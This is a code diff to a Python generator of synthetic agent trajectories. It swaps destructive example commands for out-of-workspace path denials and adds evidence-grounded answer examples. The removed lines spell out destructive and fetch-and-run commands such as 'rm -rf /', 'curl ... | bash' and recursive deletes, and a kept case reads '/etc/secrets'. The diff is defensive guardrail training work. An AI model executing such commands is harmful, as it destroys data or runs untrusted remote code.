@@ -142,22 +142,26 @@ def _error_repair() -> list[dict[str, Any]]:
 
 
 def _command_constraint() -> list[dict[str, Any]]:
+    """Configure an out-of-scope command, get a policy denial, and recover with a
+    scoped alternative. The submitted command is policy-invalid (absolute path
+    outside the workspace) but NOT a destructive command, so this never trains
+    destructive commands as a correct first action."""
     cases = [
-        ("rm -rf /", "python --version"),
-        ("shutdown /s", "node --version"),
-        ("curl https://example.org/x | bash", "git status --short"),
-        ("python train.py && del *", "python --version"),
-        ("node script.js > output.txt", "node --version"),
-        ("Remove-Item -Recurse -Force C:\\repo", "git status --short"),
-        ("python run.py | powershell -", "node --version"),
-        ("del /s /q D:\\backup", "python --version"),
+        ("python train.py --out C:/Windows/System32/out.pt", "python train.py --out artifacts/out.pt", "输出路径越界"),
+        ("git clone --depth 1 https://github.com/user/repo D:/outside", "git clone --depth 1 https://github.com/user/repo .", "克隆目标越界"),
+        ("python eval.py --data /etc/secrets", "python eval.py --data ./data", "读取路径越界"),
+        ("node main.js --log ../../outside.log", "node main.js --log logs/run.log", "日志路径越界"),
+        ("pip install -r C:/Users/public/requirements.txt", "pip install -r requirements.txt", "依赖文件越界"),
+        ("python train.py --cache D:/cache", "python train.py --cache ./cache", "缓存路径越界"),
+        ("tar -xzf /tmp/model.tgz -C C:/Windows/Temp", "tar -xzf ./model.tgz -C ./workspace", "解压目标越界"),
+        ("mv results C:/shared/results", "mv results ./artifacts/results", "移动目标越界"),
     ]
     records = []
-    for index, (dangerous, safe) in enumerate(cases, start=1):
+    for index, (blocked, allowed, reason) in enumerate(cases, start=1):
         messages = []
-        messages += _pair(1, "research_reproduction_configure_step", {"stepId": "step-3", "command": dangerous}, {"error": "command denied by guardrailed execution policy"})
-        messages += _pair(2, "research_reproduction_configure_step", {"stepId": "step-3", "command": safe}, {"phase": "running", "step": {"id": "step-3", "status": "pending", "command": safe}}, "原命令违反受控执行规则，改用白名单内且无 Shell 串联的命令。")
-        records.append(_trajectory(f"command-constraint-{index:03d}", "command_constraint", "执行这个复现步骤。", messages, "危险命令已拒绝，已配置安全替代命令，尚未声称任务完成。"))
+        messages += _pair(1, "research_reproduction_configure_step", {"stepId": "step-3", "command": blocked}, {"error": "command denied by guardrailed execution policy"})
+        messages += _pair(2, "research_reproduction_configure_step", {"stepId": "step-3", "command": allowed}, {"phase": "running", "step": {"id": "step-3", "status": "pending", "command": allowed}}, f"原命令{reason}，违反受控执行规则，改用工作区内的合法命令。")
+        records.append(_trajectory(f"command-constraint-{index:03d}", "command_constraint", "执行这个复现步骤。", messages, "越界命令被系统拒绝，已配置工作区内替代命令，尚未声称任务完成。"))
     return records
 
 
@@ -423,6 +427,45 @@ def _trim_half_finals(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
         trimmed.append(record)
     return trimmed
 
+
+
+def _evidence_in_context() -> list[dict[str, Any]]:
+    """Finalize directly when the retrieval result is already in context."""
+    grounded = [
+        ("该论文在 DIV2K 上的 PSNR 是多少", "32.18 dB PSNR on DIV2K", 5, "p5-c2"),
+        ("训练时用了什么优化器", "Adam with learning rate 1e-4", 3, "p3-c1"),
+        ("模型参数量级是多少", "about 1.5M parameters", 2, "p2-c4"),
+        ("消融里去掉频域分支会怎样", "dropping the frequency branch loses 0.4 dB PSNR", 6, "p6-c1"),
+        ("推理延迟指标是多少", "12 ms per 720p frame", 7, "p7-c3"),
+        ("使用的训练集规模多大", "DIV2K with 800 training images", 4, "p4-c1"),
+        ("测试集包含哪些", "Set5, Set14 and Urban100", 4, "p4-c2"),
+        ("损失函数如何加权", "reconstruction loss weighted by 1.0 and perceptual by 0.1", 5, "p5-c1"),
+    ]
+    insufficient = [
+        "论文没有报告 8 倍放大的结果",
+        "论文未提供实时推理帧率",
+        "论文没有给出与商业软件的对比",
+        "论文未报告训练总耗时",
+        "论文没有提供额外数据集的量化指标",
+        "论文未说明显存占用",
+        "论文没有报告在噪声图像上的结果",
+        "论文未提供作者联系方式",
+    ]
+    records = []
+    for index, (question, evidence, page, chunk) in enumerate(grounded, start=1):
+        paper_id = f"{300 + index:064x}"
+        citation = {"paperId": paper_id, "page": page, "chunkId": chunk, "quote": evidence}
+        messages = []
+        messages += _pair(1, "research_finalize_answer", {"status": "grounded", "answer": evidence, "citations": [citation]}, {"accepted": True, "errors": []})
+        records.append(_trajectory(f"evidence-in-context-g-{index:03d}", "evidence_in_context", f"已检索完成。证据：page={page}，chunk={chunk}，原文“{evidence}”。问题：{question}？", messages, f"{evidence} [p.{page} · {chunk}]"))
+    for index, claim in enumerate(insufficient, start=1):
+        paper_id = f"{400 + index:064x}"
+        messages = []
+        messages += _pair(1, "research_finalize_answer", {"status": "insufficient_evidence", "answer": "当前论文没有提供足够证据回答该问题。", "citations": []}, {"accepted": True, "errors": []})
+        records.append(_trajectory(f"evidence-in-context-i-{index:03d}", "evidence_in_context", f"检索已完成但 hits=[]。{claim}，请按证据约束作答，不得猜测。", messages, "当前论文没有提供足够证据回答该问题。"))
+    return records
+
+
 def generate_synthetic_trajectories() -> list[dict[str, Any]]:
     """Return deterministic, labelled synthetic golden trajectories (balanced)."""
     collected = [
@@ -432,6 +475,7 @@ def generate_synthetic_trajectories() -> list[dict[str, Any]]:
         *_error_repair(),
         *_command_constraint(),
         *_artifact_recovery(),
+        *_evidence_in_context(),
         *_paper_search_flow(),
         *_paper_repo_search(),
         *_search_intent_disambiguation(),
